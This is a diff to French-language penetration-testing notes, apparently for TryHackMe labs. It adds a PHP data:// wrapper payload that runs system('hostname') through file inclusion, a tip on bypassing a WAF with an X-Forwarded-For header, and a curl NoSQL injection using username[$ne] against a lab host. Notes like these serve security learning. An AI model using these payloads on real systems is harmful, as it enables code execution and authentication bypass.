@@ -328,10 +328,31 @@ qui vont permettre d'encoder la donnée:
 php://filter/convert.base64-encode/resource=FILE
 ```
 
+OMG WAOUH on peut faire du RCE en utilisant [le bon filtre](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-data):
+
+```txt
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdob3N0bmFtZScpOyA/Pg==
+```
+
+Le payload étant un base64 de `<?php system("hostname"); ?>`
+
 ## Bypass WAF
 
 Ajouter un header [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
 peut override celui du WAF et donc bypass la protection.
+
+## NoSQL Injections
+
+Curl à toutes les options qu'il faut pour encoder les entrées, même en query
+string:
+
+```bash
+curl --include 'http://10-10-100-154.p.thmlabs.com/search' \
+	--cookie-jar ./cookies --cookie ./cookies \
+	--get \
+	--data-urlencode 'username[$ne]=xyz' \
+	--data-urlencode 'role=guest'
+```
 
 ## SQL Injections
 
